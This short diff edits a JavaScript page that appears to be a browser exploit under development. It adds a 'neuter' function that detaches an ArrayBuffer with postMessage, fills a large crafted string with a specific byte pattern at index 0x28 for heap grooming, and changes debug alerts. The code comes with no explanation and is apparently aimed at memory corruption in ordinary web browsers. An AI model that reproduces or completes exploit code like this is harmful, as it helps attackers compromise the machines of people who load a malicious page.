@@ -1,6 +1,6 @@
 <script>
 
-alert("startb");
+alert("startbb");
 function neuter(ab) {
 
     postMessage("", "*", [ab]);
@@ -42,8 +42,11 @@ var y = "";
 
 var tmpy="";
 for(var i=0x0;i<0x10000/2;i++){
-    y+="\u0080\u0000";
-
+    if(i==0x28){
+    y+="\u8080\u8080";
+    }else{
+    y+="\u0000\u0000";
+    }
 }
 
 var array=new Array(0x100);
